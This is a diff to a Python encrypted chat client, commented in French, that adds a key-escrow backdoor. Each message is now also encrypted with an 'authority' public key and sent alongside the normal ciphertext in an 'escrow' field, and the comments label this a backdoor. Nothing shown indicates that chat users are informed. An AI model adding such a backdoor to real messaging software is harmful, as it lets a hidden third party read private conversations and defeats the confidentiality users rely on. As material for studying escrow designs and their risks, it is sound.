@@ -7,6 +7,7 @@ import time
 import sys
 from datetime import datetime
 import hashlib
+import uuid
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
 
@@ -296,7 +297,6 @@ def fetch_live_messages(target):
                             sys.stdout.write('\r' + ' ' * 80 + '\r')
                             print(f"[{datetime.fromtimestamp(timestamp).strftime('%H:%M')}] {sender} : {text}")
                             sys.stdout.write(f"{username} > ")
-                            print('\a', end='')
                             sys.stdout.flush()
                             save_received_message(sender, timestamp, text)
                             seen.add(raw_message)
@@ -310,7 +310,7 @@ def fetch_live_messages(target):
 def chat_session(target):
     """
     Gère une session de discussion avec un utilisateur donné.
-    Affiche les messages précédents et permet d'envoyer de nouveaux messages.
+    Envoie une copie chiffrée du message à l'autorité via une backdoor (key escrow).
     """
     global running
     private_key, _ = load_keys()
@@ -320,6 +320,15 @@ def chat_session(target):
         print("[ERREUR] Clé du destinataire introuvable.")
         return
     public_key = serialization.load_pem_public_key(key_pem.encode())
+
+    # Charger la clé publique de l'autorité
+    try:
+        with open("authority_keys/authority_public.pem", "rb") as f:
+            authority_key = serialization.load_pem_public_key(f.read())
+    except FileNotFoundError:
+        print("[ERREUR] Fichier 'authority_public.pem' manquant.")
+        return
+
 
     messages = load_sent_messages(target) + load_sent_messages_from(target)
     messages.sort(key=lambda m: m['timestamp'])
@@ -348,16 +357,25 @@ def chat_session(target):
                 hashes.SHA256()
             )
 
-            # Chiffrement du message clair
+            # Chiffrement pour le destinataire
             ciphertext = public_key.encrypt(
                 full_message.encode(),
                 padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
             )
 
-            # Envoi structuré avec message chiffré + signature
+            # Chiffrement pour l'autorité (key escrow)
+            escrow_encrypted = authority_key.encrypt(
+                full_message.encode(),
+                padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+            )
+            message_id = uuid.uuid4().hex
+
+            # Payload avec backdoor
             payload = {
                 "message": ciphertext.hex(),
-                "signature": signature.hex()
+                "signature": signature.hex(),
+                "escrow": escrow_encrypted.hex(), # Chiffrement pour l'autorité
+                "id": message_id
             }
 
             send_request({
@@ -372,7 +390,6 @@ def chat_session(target):
     finally:
         running = False
         listener.join()
-
 
 def discussion_menu():
     """
